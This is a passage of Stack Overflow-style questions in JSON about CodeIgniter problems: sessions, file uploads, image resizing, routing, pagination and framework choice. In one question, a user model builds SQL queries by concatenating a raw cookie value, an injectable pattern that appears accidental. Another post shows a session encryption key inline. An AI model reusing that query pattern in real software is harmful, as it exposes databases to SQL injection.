/&gt;&lt;/td&gt;\n      &lt;/tr&gt;\n      &lt;tr&gt;\n        &lt;td background=\"&lt;?php echo base_url();?&gt;images/bg/left-menu-white-bg.gif\"&gt;&lt;table width=\"191\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"&gt;\n          &lt;tr&gt;\n            &lt;td height=\"6\" align=\"left\" valign=\"top\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/left-bttom.gif\" width=\"6\" height=\"6\" /&gt;&lt;/td&gt;\n            &lt;td width=\"100%\" background=\"&lt;?php echo base_url();?&gt;images/bg/leftbottom.gif\"&gt;&lt;/td&gt;\n            &lt;td height=\"6\" align=\"right\" valign=\"top\"&gt;&lt;img src=\"&lt;?php echo base_url();?&gt;images/bg/right-bttom.gif\" width=\"6\" height=\"6\" /&gt;&lt;/td&gt;\n          &lt;/tr&gt;\n        &lt;/table&gt;&lt;/td&gt;\n      &lt;/tr&gt;\n    &lt;/table&gt;\n         &lt;br /&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;\n    &lt;td valign=\"top\"  &lt;? if($main_content != 'dashboard' || $main_content == 'publisher_dashboard') { ?&gt; colspan=\"3\" &lt;? } ?&gt;&gt;&lt;?php $this-&gt;load-&gt;view($main_content); ?&gt;&lt;/td&gt;\n    &lt;td&gt;&amp;nbsp;&lt;/td&gt;\n    &lt;? if($main_content == 'dashboard' || $main_content == 'publisher_dashboard') { ?&gt;\n    &lt;td align=\"right\" valign=\"top\"&gt; &lt;?php $this-&gt;load-&gt;view('includes/login/left'); ?&gt;\n    &lt;/td&gt;\n    &lt;? } ?&gt;\n    &lt;td&gt;&amp;nbsp;&lt;/td&gt;\n  &lt;/tr&gt;\n&lt;/table&gt;\n&lt;?php $this-&gt;load-&gt;view('includes/login/footer'); ?&gt;\n</code></pre>\n\n<p>Here in the above code i am checking whether logged in user is having permission for access then do else part otherwise through the error from if case block. </p>\n\n<p>In IF case it loads the error template.</p>\n\n<p>Please somebody help me to fix the above issue ASAP!</p>\n"},{"tags":["php","codeigniter","folder","mkdir"],"answer_count":3,"favorite_count":4,"up_vote_count":2,"down_vote_count":0,"view_count":5006,"score":2,"question_id":3645404,"title":"How do I get CodeIgniter to create new folders?","body":"<p>I have a user system where, when you register for an account, it's supposed to automatically create a new folder for you.</p>\n\n<p>I've placed something along the lines of <em>mkdir('./upload/' . $this->session->userdata('id'), 0, true)</em> in my <em>Register</em> controller but to no avail.</p>\n\n<p>Does anybody know how to get it to work?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":68,"score":3,"question_id":12831897,"title":"Regular Expression in Codeigniter routes with duplicate name","body":"<p>What I want to do is if I got duplicate name routes,I just use one route instead using 3 routes, but I not sure what regular expression I need to use, any suggestion?</p>\n\n<p>now I have this</p>\n\n<pre><code>product_test_1.html\nproduct_test_2.html\nproduct_test_3.html\n</code></pre>\n\n<p>my codeigniter routes</p>\n\n<pre><code>$route['product_test_1.html'] = \"website/product\";\n$route['product_test_2.html'] = \"website/product\";\n$route['product_test_3.html'] = \"website/product\";\n</code></pre>\n\n<p>something what I want (but its not working)</p>\n\n<pre><code>$route['/product_test/i'] = \"website/product\";\n</code></pre>\n\n<p>Any idea solve my problem ? \nthanks</p>\n"},{"tags":["php","codeigniter","loops","foreach"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":58,"score":-4,"question_id":12754643,"title":"Subarray within foreach loop php","body":"<p>I have this code here:</p>\n\n<pre><code>&lt;?php foreach($blog_posts['post_category'] as $category) {  ?&gt;\n</code></pre>\n\n<p>How can I get this to work?</p>\n\n<p>Basically I have a database with all my blog posts within them, one of the columns is <code>post_category</code> I'm trying to make a list out of all these by a foreach statement that gets the results like so:</p>\n\n<pre><code>$data['blog_categories'] = $this-&gt;db-&gt;query(\"SELECT `post_category` FROM `blog_posts`\");\n</code></pre>\n\n<p>This is codeigniter by the way... Then in my view I have the code:</p>\n\n<pre><code>&lt;?php foreach($blog_posts['post_category'] as $category) {  ?&gt;\n</code></pre>\n\n<p>I need to display each category in an li...</p>\n"},{"tags":["arrays","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":64,"score":2,"question_id":12832111,"title":"Codeigniter: Display data in array, error: Trying to get property of non-object","body":"<p>Ok so i'm trying to display data within an array. </p>\n\n<p><strong>My View:</strong></p>\n\n<pre><code>echo form_open(base_url() . 'membersController/searchMember/');\necho form_label('Member ID: ', 'memID', array('for' =&gt; 'memID'));\necho form_input(array('type' =&gt; 'text', \n                      'name' =&gt; 'memID', \n                      'id' =&gt; 'memID', \n                      'value' =&gt; set_value('memID')));\necho form_submit(array('type' =&gt; 'submit', 'value' =&gt; 'Search'), 'Search') . \"&lt;br /&gt;\";\necho form_close();\nif (empty($data)) {\n\n} else {\n//displaying the array\n}\n</code></pre>\n\n<p><strong>My Controller:</strong></p>\n\n<pre><code>public function searchMember() {\n    $memID = $this-&gt;input-&gt;post('memID');\n    //Load membersModel\n    $this-&gt;load-&gt;model('membersModel');\n    //Access the getMemberData function to search for a member\n    $data['memDetails'] = $this-&gt;membersModel-&gt;getMemberData($memID);\n</code></pre>\n\n<p>//The line below is just to test that the array is being filled</p>\n\n<pre><code>    echo $data[0]-&gt;memFname;\n\n    if (empty($data)) {\n        echo \"Hi\";\n        $message = \"Member not found!\";\n        echo $message;\n    } else {\n        //Load view\n        $this-&gt;load-&gt;view('memberView', $data);\n    }\n}\n</code></pre>\n\n<p><strong>My Model:</strong></p>\n\n<pre><code>function getMemberData($memID) {\n    //SQL Statement to get a Member from the database based on member ID\n    $data = array();\n    $this-&gt;db-&gt;select('*');\n    $this-&gt;db-&gt;from('members');\n    $this-&gt;db-&gt;where('memID', $memID);\n    $query = $this-&gt;db-&gt;get();\n    if ($query-&gt;num_rows() &gt; 0) {\n        foreach ($query-&gt;result() as $row) {\n            $data['memberdata'] = $row;\n        }\n    }\n    $query-&gt;free_result();\n    //return the array to the controller\n    return $data;\n}\n</code></pre>\n\n<p><strong>I keep getting these errors:</strong></p>\n\n<p><em>A PHP Error was encountered</em></p>\n\n<p>Severity: Notice</p>\n\n<p>Message: Undefined offset: 0</p>\n\n<p>Filename: controllers/membersController.php</p>\n\n<p>Line Number: 24</p>\n\n<p><em>A PHP Error was encountered</em></p>\n\n<p>Severity: Notice</p>\n\n<p>Message: Trying to get property of non-object</p>\n\n<p>Filename: controllers/membersController.php</p>\n\n<p>Line Number: 24</p>\n"},{"tags":["php","codeigniter","controller"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12831255,"title":"Codeigniter execute code in every controller","body":"<p>I'm rather new to Codeigniter, so I may be going about this the wrong way. In the header for my template, I have a spot for displaying account information or a message to log in. </p>\n\n<p>In order for it to work properly, each controller obviously need to have the same code. To avoid this, the user guide says I should be able to extend CI_Controller and it automatically includes that code. However, that's not working for me. Here's what I've got.</p>\n\n<p>application/core/MY_Controller.php:</p>\n\n<pre><code>&lt;?php\nclass MY_Controller extends CI_Controller {\nfunction __construct()\n{\n    parent::__construct();\n    $this-&gt;load-&gt;database();\n    $this-&gt;load-&gt;model('user_model');\n\n    if ( $this-&gt;user_model-&gt;validateToken ( $this-&gt;input-&gt;cookie('session_token', TRUE) ) ) \n    {\n        $data['login_info'] = 'Logged in as '. $this-&gt;user_model-&gt;getUsernameAsLink($this-&gt;input-&gt;cookie('session_token', TRUE)).'&lt;BR /&gt;\n        &lt;a href=\"/dashboard\"&gt;Control Panel&lt;/a&gt;';\n    }\n    else\n    {\n        $data['login_info'] = 'You are not logged in&lt;BR /&gt;\n        &lt;a href=\"/account/login\"&gt;Log In&lt;/a&gt;';\n    }      \n}\n}\n?&gt;\n</code></pre>\n\n<p>the model it references:</p>\n\n<pre><code>&lt;?php\nclass User_model extends CI_Model {\n\npublic function __construct()\n{\n\n}\n\npublic function validateToken($token)\n{\n    // Get token from database to check against cookie\n    $query = $this-&gt;db-&gt;query('SELECT `login_token` FROM `Users` WHERE `login_token` = \"'.$token.'\"');\n\n    // Match Found?\n    $rowCount = $query-&gt;num_rows();\n\n    if ( $rowCount == 1 ) {\n        return true;\n    } else {\n        return false;\n    }\n}\n\npublic function getUsernameAsLink ( $token )\n{\n    // Get token from database to check against cookie\n    $query = $this-&gt;db-&gt;query('SELECT `username` FROM `Users` WHERE `login_token` = \"'.$token.'\"');\n\n    foreach( $query-&gt;result() as $row ) {\n        $username = $row-&gt;username;\n    }\n\n    $returnString = '&lt;a href=\"/profile/'. $username .'\"&gt;'.ucfirst ( $username ).'&lt;/a&gt;';\n\n    return $returnString;    \n}\n}\n?&gt;\n</code></pre>\n\n<p>I'm getting notice errors saying that the $data['login_info'] value doesn't exist. Is there anything I've left out to keep it from processing the extension to MY_Controller?</p>\n"},{"tags":["php","codeigniter","codeigniter-2","php-frameworks"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":841,"score":0,"question_id":8574359,"title":"User data in codeigniter session can't be accessed on multiple pages/views","body":"<p>I am facing problems in codeigniter 2.x session class. I want to have userid in session for global access on my pages after user login</p>\n\n<p>I have 2 views and 1 controller\none view one i had a login form when a user submits the form \ni validate it and create session user data by calling a method within controller as</p>\n\n<pre><code>function create_session($data) {        \n        $mydata = array(\n                   'userid'  =&gt; $data,\n                   'role'     =&gt; $role,\n                   'logged_in' =&gt; TRUE\n               );\n\n        $this-&gt;session-&gt;set_userdata($mydata);\n\n        return;\n    }\n</code></pre>\n\n<p>then my 2nd view is loaded \nand i have on that view</p>\n\n<pre><code>print_r($this-&gt;session-&gt;userdata); \n</code></pre>\n\n<p>and it print out the right results</p>\n\n<p>but when i click on 1st view in navigation\ni fond that</p>\n\n<pre><code>[userdata] =&gt; \n</code></pre>\n\n<p>its empty\nmy session configuration is as</p>\n\n<pre><code>$config['encryption_key'] = 'askdfjowieuriomzx,mv';\n$config['sess_cookie_name'] = 'wana_session';\n$config['sess_expiration'] = 7200;\n$config['sess_expire_on_close'] = FALSE;\n$config['sess_encrypt_cookie'] = TRUE;\n$config['sess_use_database'] = TRUE;\n$config['sess_table_name'] = 'wana_sessions';\n$config['sess_match_ip'] = FALSE;\n$config['sess_match_useragent'] = TRUE;\n$config['sess_time_to_update'] = 300; \n</code></pre>\n\n<p>I have searched the forums, but i can’t solve this problem\nplease solve this issue or suggest an alternative method.</p>\n"},{"tags":["codeigniter","image-processing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12814431,"title":"CI multiple image resizing","body":"<p>I'm uplaoding multiple images with CI, they do upload. I am also trying to resize them,<br>\n   with the following code, only the first image resizes, rest of them don't.  They get uploaded with their current size.\nWhat's wrong?  </p>\n\n<p>Any help'd be really, really appreciated.</p>\n\n<pre><code>function doupload() {\n\n    $path = array();\n    $count = count($_FILES['userfile']['size']);\n\n    foreach($_FILES as $key=&gt;$value){\n        for($n=0; $n&lt;=$count-1; $n++) {\n            $_FILES['userfile']['name']=$value['name'][$n];\n            $_FILES['userfile']['type']    = $value['type'][$n];\n            $_FILES['userfile']['tmp_name'] = $value['tmp_name'][$n];\n            $_FILES['userfile']['error']       = $value['error'][$n];\n            $_FILES['userfile']['size']    = $value['size'][$n];   \n\n                $config['upload_path'] = './images';\n                $config['allowed_types'] = 'gif|jpg|png|jpeg';\n\n            $this-&gt;load-&gt;library('upload', $config);\n            $this-&gt;upload-&gt;do_upload();\n            $data = $this-&gt;upload-&gt;data();\n            $path[] = $data['full_path']; //contains full path of every image\n        }\n    }   \n\n    foreach($path as $p=&gt;$ath){\n        $config1 = array(\n        'source_image'      =&gt; $ath,\n        'new_image'         =&gt; './images',\n        'maintain_ration'   =&gt; true,\n        'overwrite'         =&gt; true, \n        'width'             =&gt; 600,\n        'height'            =&gt; 400\n        );\n\n        $this-&gt;load-&gt;library('image_lib', $config1);            \n        $this-&gt;image_lib-&gt;resize();\n        $this-&gt;image_lib-&gt;clear();\n\n    }\n\n\n}\n</code></pre>\n"},{"tags":["codeigniter","image-processing","if-statement"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12822018,"title":"CI-file upload, error-showing-if/else causes image duplication","body":"<p>I had somehow managed to upload and resize multiple images, everything was fine.<br>\n Then i wanted to show errors if no image was selected to upload.<br>\nI put a if statement to load the error but that's causing a havoc.  </p>\n\n<p>Each time i select images and upload, the last one gets duplicated, without resizing.<br>\nAgain, if i remove the if else, it's perfectly fine.  </p>\n\n<p>Thankyou for any help and your time.</p>\n\n<pre><code>function do_upload(){\n\n\n    $path = array();\n    $count = count($_FILES['userfile']['size']);\n\n    foreach($_FILES as $key=&gt;$value){\n        for($n=0; $n&lt;=$count-1; $n++) {\n            $_FILES['userfile']['name']=$value['name'][$n];\n            $_FILES['userfile']['type']    = $value['type'][$n];\n            $_FILES['userfile']['tmp_name'] = $value['tmp_name'][$n];\n            $_FILES['userfile']['error']       = $value['error'][$n];\n            $_FILES['userfile']['size']    = $value['size'][$n];   \n\n                $config['upload_path'] = './images';\n                $config['allowed_types'] = 'gif|jpg|png|jpeg';\n\n            $this-&gt;load-&gt;library('upload', $config);\n            $this-&gt;upload-&gt;do_upload();\n            $data = $this-&gt;upload-&gt;data();\n            $path[] = $data['full_path'];\n        }   \n\n\n\n        if(!$this-&gt;upload-&gt;do_upload()){\n            $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n            $this-&gt;load-&gt;view('view_dashboard_error_car', $error);\n        }\n        else{\n            $this-&gt;load-&gt;library('image_lib');   \n\n            foreach($path as $p=&gt;$ath){\n                $config1 = array(\n                'source_image'      =&gt; $ath,\n                'new_image'         =&gt; './images',\n                'maintain_ration'   =&gt; true,\n                'overwrite'         =&gt; true, \n                'width'             =&gt; 600,\n                'height'            =&gt; 400\n                );\n\n                $this-&gt;image_lib-&gt;initialize($config1);\n                $this-&gt;image_lib-&gt;resize();\n                $this-&gt;image_lib-&gt;clear();\n            }       \n\n\n\n            $this-&gt;load-&gt;view('view_dashboard_success_car');\n\n        }\n\n\n\n\n\n    }   \n\n\n\n\n}\n</code></pre>\n"},{"tags":["php","codeigniter","netbeans"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":55,"score":-1,"question_id":12829837,"title":"Codeigniter wont start","body":"<p>i'm running a acer duel core with Ubuntu 11.10, i installed xampp and Codeigniter,put the code for codeigniter in the htdocs folder of xammp, tried to run codeigniter in netbeans and all i got was:</p>\n\n<p>This webpage is not available\nChromium's connection attempt to localhost was rejected. The website may be down, or your network may not be properly configured.</p>\n\n<p>can anyone give me an idea what i am doing wrong... thank you...</p>\n\n<p>CodeIgniter 2.1.3\nXampp 1.8.1\nAcer Aspire 5920\n3gb of ram\nIntel(R) Core(TM)2 Duo CPU     T5450  @ 1.66GHz</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12828225,"title":"While submitting the form i am getting the page not found in codeigniter","body":"<p>I am new to codeigniter. While submitting the form i am getting 404 error page not found.Actually without entering the username and password it should work the valudations. Here is the code.</p>\n\n<blockquote>\n  <p>login.php in controller</p>\n</blockquote>\n\n<pre><code>public function verifyuser()\n        {\n\n          $this-&gt;load-&gt;library('form_validation');\n          $this-&gt;form_validation-&gt;set_rules('username','username','required');\n          $this-&gt;form_validation-&gt;set_rules('password','password','required');\n\n          if($this-&gt;form_validation-&gt;run() == FALSE){\n            $this-&gt;load-&gt;view('login/login');\n        }else{\n        $this-&gt;load-&gt;model('login/validate');\n        }\n        }\n</code></pre>\n\n<p>*<strong><em>login/login.php</em>*</strong></p>\n\n<pre><code>&lt;?php echo form_open('verifyuser'); ?&gt;\n    &lt;!--  start login-inner --&gt;\n    &lt;div id=\"login-inner\"&gt;\n        &lt;table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"&gt;\n        &lt;tr&gt;\n            &lt;th&gt;Username&lt;/th&gt;\n            &lt;td&gt;&lt;input type=\"text\" name=\"username\"  class=\"login-inp\" /&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;th&gt;Password&lt;/th&gt;\n            &lt;td&gt;&lt;input type=\"password\" name=\"password\" value=\"************\"  onfocus=\"this.value=''\" class=\"login-inp\" /&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;th&gt;&lt;/th&gt;\n            &lt;td valign=\"top\"&gt;&lt;input type=\"checkbox\" class=\"checkbox-size\" id=\"login-check\" /&gt;&lt;label for=\"login-check\"&gt;Remember me&lt;/label&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;th&gt;&lt;/th&gt;\n            &lt;td&gt;&lt;input type=\"submit\" value=\"submit\" class=\"submit-login\"  /&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;/table&gt;\n    &lt;/div&gt;\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1549,"score":1,"question_id":2577968,"title":"PHP - CodeIgniter","body":"<p>I try to write a site with CodeIgniter but I've a problem with PHP. I'm sure that it's so simple and can't be wrong. But I don't know bugs from , just a newbie of CodeIgniter :)</p>\n\n<pre><code>    &lt;html&gt;  \n    &lt;head&gt;  \n        &lt;title&gt;&lt;?=$page_title?&gt;&lt;/title&gt;  \n    &lt;/head&gt;  \n    &lt;body&gt;  \n        &lt;?php foreach($result as $row):?&gt;  \n        &lt;h3&gt;&lt;? echo $row-&gt;title; ?&gt;&lt;/h3&gt;  \n        &lt;p&gt;&lt;? echo $row-&gt;text; ?&gt;&lt;/p&gt;  \n        &lt;?php endforeach;?&gt;  \n    &lt;/body&gt;  \n&lt;/html&gt; \n</code></pre>\n\n<p>I've a bug from this file :</p>\n\n<blockquote>\n  <p>A PHP Error was encountered</p>\n  \n  <p>Severity: Warning</p>\n  \n  <p>Message: Invalid argument supplied for\n  foreach()</p>\n  \n  <p>Filename: views/helloworld_view.php</p>\n  \n  <p>Line Number: 6</p>\n</blockquote>\n\n<p>thanks in advance for reading this :)</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":53,"score":0,"question_id":12827622,"title":"CodeIgniter recommended tutorials?","body":"<p>I'm .net developer I have some project i have to use php for note I know php but I want to ask if someone know good tutorials \"walkthough\" in how to create simple Web app using CodeIgniter with MySql ?</p>\n"},{"tags":["php","codeigniter","pdf"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":296,"score":0,"question_id":10754915,"title":"DOMPDF and writing to file with CodeIgniter","body":"<p>Trying to get a PDF to write to file using <code>write_file()</code>, but the PDF is being created with 0 bytes of data.</p>\n\n<pre><code>$this-&gt;load-&gt;helper(array('pdf_create','file'));\n//$html = $this-&gt;load-&gt;view('accounts/invoices/pdf/view', $this-&gt;view_data);\n$html = $this-&gt;load-&gt;view('accounts/invoices/pdf/view', $this-&gt;view_data, true);\n\n$pdf_data = pdf_create($html, '', false);\n\nif ( ! write_file('invoices/'.$filename.'.pdf', $pdf_data))\n{\n    echo 'Unable to write the file';\n}\nelse\n{\n    echo 'File written!';\n}\n</code></pre>\n\n<p>If I change:</p>\n\n<pre><code>$pdf_data = pdf_create($html, '', false);\n</code></pre>\n\n<p>to:</p>\n\n<pre><code>$pdf_data = pdf_create($html, '', true);\n</code></pre>\n\n<p>then the file is created correctly, but forced to download in the browser. But when it's false, the file is 0 bytes in size. What's causing the problem?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":820,"score":0,"question_id":8282871,"title":"Code Igniter File Upload Class - How to change saved filename?","body":"<p>I'm writing an app using the CodeIgniter framework, and I'm utilizing the CI File Uploading class to upload image files to the server from a web form.</p>\n\n<p>The files upload fine, but I would like to be able to save them under a different, unique name on the server. I would like to tell the File Upload class to save the files to the server using that different, unique filename for each file, but I haven't been able to figure out how to do so.</p>\n\n<p>I've checked the CI docs for that class, and all I've found is that you can use the class to encrypt the filename, but I don't believe that will give me a unique filename, it just encrypts it. </p>\n\n<p>I already have the functionality in the app that assigns a unique filename, so I just need to figure out how to get the File Uploading class to accept that alternate filename each time I save a file. Anyone know if it's possible to do that?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12826470,"title":"How to create one codeigniter menu?","body":"<p>So I'm creating a website with CodeIgniter, and It would be great, if I just could edit for example one config file in which I have specified all the menu, and it would edit it for all view files. </p>\n\n<p>So basically in simple OOP i would do this just with a function, but what is the best way to do it in CodeIgniter? Should I use Helper for that?</p>\n"},{"tags":["php","codeigniter","parameters","pagination","conflict"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12826179,"title":"CodeIgniter: Pagination conflict with Parameter","body":"<p>This is my situation:\nI have page <strong>localhost/ctc/product</strong> to show products and <strong>localhost/ctc/product/abcxyz</strong> to show detail of individual product abcxyz. It works fine until I want to paginate my main page because list of products is too long. I use usual pagination class to paginate but when I come to next page the url become like this: <strong>localhost/ctc/product/1</strong> and I think it mistake the pagination number to a product and the page show nothing. So how can I solve this problem ? Thanks all of you and sorry for my broken English.</p>\n\n<p>Problem solved. Thanks to John B and otporan.</p>\n"},{"tags":["php","security",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":269,"score":0,"question_id":9412997,"title":"Codeigniter & disallowed key characters issue with my htaccess","body":"<p>I have setup an htaccess rule (see below)</p>\n\n<pre><code>RewriteRule ^images/(.*) http://www.mysite.com [R=301,L]\n</code></pre>\n\n<p>My intention is that any of the following links will be redirected to site.com the problem is the question mark character (?) as this causes an 'Disallowed key characters' error in Codeigniter framework. I could modify the permitted characters in the config file but this is not recommended for security purposes.</p>\n\n<p>The links I aim to redirect looks like the following..</p>\n\n<pre><code>http://www.site.com/images/flash/main.swf?config=/flash/flash_output/133/location.htm\n</code></pre>\n\n<p>Can anyone suggest a workaround that doesn't involve <a href=\"http://stackoverflow.com/q/9413223/367456\">changing the permitted characters in the config</a>, or is this the only workable option?</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12822262,"title":"Validate image uploads first and only then insert text data linked to the images in separate tables","body":"<p>I have a form that allows me to upload images and bunch of text data into database tables. Images are connected to the text data via foreign keys.</p>\n\n<p>Problem is if the form encounters a problem with uploading an image - the text data still gets inserted(if it pases its own validation).</p>\n\n<p>Is there any way to first validate the images and if everything is alright then insert the text data along with images' file names into respective tables?</p>\n\n<p><strong>controller:</strong></p>\n\n<pre><code>function addDataRow()\n        {\n            //Set common properties\n            $data['title'] = 'Add new data row';\n            $data['action'] = site_url('crud/addDataRow');\n            $data['link_back'] = anchor('crud/index/', 'Back to list', array('class' =&gt; 'back'));\n\n            //Set validation properties\n            $this-&gt;_set_fields();\n            $this-&gt;_set_rules();\n\n            //Run validation\n            if($this-&gt;form_validation-&gt;run() == FALSE)\n            {\n                $data['message'] = '';\n            }\n            else\n            {\n                //Get the text data from $_POST\n                $data_row = array(\n                    'title' =&gt; $this-&gt;input-&gt;post('title'),\n                    'text' =&gt; $this-&gt;input-&gt;post('text'),\n                    'price' =&gt; $this-&gt;input-&gt;post('price'),\n                    'status' =&gt; $this-&gt;input-&gt;post('status'),\n                    'type' =&gt; $this-&gt;input-&gt;post('type')\n                );\n\n                //Insert text data into table\n                $id = $this-&gt;crud_model-&gt;save($data_row);\n\n                //Now move on to image processing\n                //original image upload settings\n                $path_to_uploads= './assets/upload';\n                $config['allowed_types'] = 'gif|jpg|png';\n                $config['max_size'] = '6000';\n                $config['max_width']  = '1920';\n                $config['max_height']  = '1920';\n                $config['upload_path'] = $path_to_uploads;\n                $this-&gt;load-&gt;library('upload', $config);\n\n                $arr_files = @$_FILES['thumb'];\n\n                $_FILES = array();\n                foreach(array_keys($arr_files['name']) as $h){\n                    $_FILES[\"file_{$h}\"] = array(\n                        'name' =&gt; $arr_files['name'][$h],\n                        'type' =&gt; $arr_files['type'][$h],\n                        'tmp_name' =&gt; $arr_files['tmp_name'][$h],\n                        'error' =&gt; $arr_files['error'][$h],\n                        'size' =&gt; $arr_files['size'][$h]\n                    );\n                }\n\n                //Initialize upload\n                $this-&gt;upload-&gt;initialize($config);\n\n                foreach(array_keys($_FILES) as $h){\n\n                    if (!$this-&gt;upload-&gt;do_upload($h)){\n                        $error = $this-&gt;upload-&gt;display_errors();\n                        //echo \"&lt;script&gt;alert($error);&lt;/script&gt;\";\n                        print($error); die;\n                        //Fix this part\n                    }else{\n                        //Start uploading               \n                        $upload_data = $this-&gt;upload-&gt;data();\n                        $file_name = $upload_data['file_name'];\n                        $full_file_path = $path_to_uploads.'/'.$file_name;\n\n\n\n                        //Insert image data into table\n                        $image_row = array(\n                        'id_path' =&gt; $file_name,\n                        'id_data_row' =&gt; $id\n                        );\n\n                        $this-&gt;crud_model-&gt;save_image($image_row);\n\n                        if($h=='file_0'){\n                            //Thumbnail config\n                            $config['image_library'] = 'gd2';\n                            $config['source_image'] = $full_file_path;\n                            $config['create_thumb'] = TRUE;\n                            $config['maintain_ratio'] = TRUE;\n                            $config['width'] = 150;\n                            $config['height'] = 150;\n\n                            $this-&gt;load-&gt;library('image_lib', $config);\n\n                            $this-&gt;image_lib-&gt;resize();\n\n                            $thumbnail_row = array(\n                            'id_path' =&gt; str_replace(\".\", \"_thumb.\", $file_name),\n                            'id_data_row' =&gt; $id\n                            );\n\n                            $this-&gt;crud_model-&gt;save_thumbnail($thumbnail_row);\n                        }       \n                    }\n                }\n                //Set form input name=\"id\"\n                $this-&gt;form_validation-&gt;id = $id;\n\n                //Set user message\n                $data['message'] = '&lt;div class=\"success\"&gt;New data row added!&lt;/div&gt;';\n            }\n\n            $this-&gt;load-&gt;view('templates/header', $data);\n            $this-&gt;load-&gt;view('pages/crud_edit', $data);\n            $this-&gt;load-&gt;view('templates/footer');\n        }\n</code></pre>\n\n<p><strong>model:</strong></p>\n\n<pre><code>//Add new data row\n        function save($data)\n        {\n\n            $this-&gt;db-&gt;insert($this-&gt;tbl_data, $data);\n            return $this-&gt;db-&gt;insert_id();\n        }\n\n        //Add the original image\n        function save_image($data)\n        {\n            $this-&gt;db-&gt;insert($this-&gt;tbl_images, $data);\n            return $this-&gt;db-&gt;insert_id();\n        }\n\n        //Add the thumbnail upload path and id of the row in data table to link them\n        function save_thumbnail($data)\n        {\n            $this-&gt;db-&gt;insert($this-&gt;tbl_thumbnails, $data);\n            return $this-&gt;db-&gt;insert_id();\n        }\n</code></pre>\n"},{"tags":["codeigniter","godaddy","http-status-code-500"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12812388,"title":"CodeIgniter throwing 500-errors, why?","body":"<p>I am hosting a website, developed in Code Ignitor and i am launching that website on Godaddy Virtual Dedicated Server. </p>\n\n<p>I have done everything, all the setting that were guided by the godaddy people and still i am facing internal server error 500.</p>\n\n<p>Please guide me for the same. What could be the reason for this issue ?</p>\n"},{"tags":["php","codeigniter","image-processing"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":84,"score":2,"question_id":12809953,"title":"How to get quality of image in PHP","body":"<p>I've been doing some speed optimization on my site using Page Speed and it gives recommendations like so:</p>\n\n<pre><code>Optimizing the following images could reduce their size by 35.3KiB (21% reduction).\n\nLosslessly compressing http://example.com/.../some_image.jpg could save 25.3KiB (55% reduction).\n</code></pre>\n\n<p>How are the calculations done to get the file size reduction numbers? How can I determine if an image is optimized in PHP?</p>\n\n<p>As I understand it, they seem to base this on the image quality (so saving at 60% in Photoshop or so is considered optimized?).</p>\n\n<p>What I would like to do is once an image is uploaded, check if the image is fully optimized, if not, then optimize it using a PHP image library such as GD or ImageMagick. If I'm right about the number being based on quality, then I will just reduce the quality as needed.</p>\n\n<p>How can I determine if an image is fully optimized in the standards that Page Speed uses?</p>\n"},{"tags":["php","zend-framework","cakephp","codeigniter","frameworks"],"answer_count":16,"favorite_count":5,"up_vote_count":5,"down_vote_count":0,"view_count":2366,"score":5,"question_id":1046091,"title":"Which PHP Framework is Right for the Following Project?","body":"<p>I have a fully working PHP web project in a procedural way, but its not up to scratch at all. I will be rewriting the web application (50+ scripts), and I want to do this quickly and properly.</p>\n\n<p><strong>About the Project</strong></p>\n\n<p>The project will be making use of FFmpeg, cron jobs, and will send many emails per day. I aim to have thousands of users (doesn't everybody). The project will also make use of Flash component external web services.</p>\n\n<p><strong>About Me</strong></p>\n\n<p>I haven't used any PHP frameworks before, but I am well versed with OOP. I am really looking for a framework that can add value to my code, since my PHP scripting isn't so \"hot\".</p>\n\n<p><strong>PHP Framework Requirements</strong></p>\n\n<p>I need a PHP framework that meets the following requirements:</p>\n\n<ul>\n<li>Easy to learn</li>\n<li>Rapid Development</li>\n<li>Lots of Modules</li>\n<li>Light and Fast</li>\n</ul>\n\n<p>I want to complete this project properly. I even have a fresh install of Fedora, so I can develop in my production environment. From reading around, it seems that CakePHP, CodeIgniter, and Zend are what I should be choosing from. I can not narrow it down any further, since I have not used any of them. It would also be great to hear from personal experiences using these frameworks, as it may help me or others that want this sort of question answered in the future. 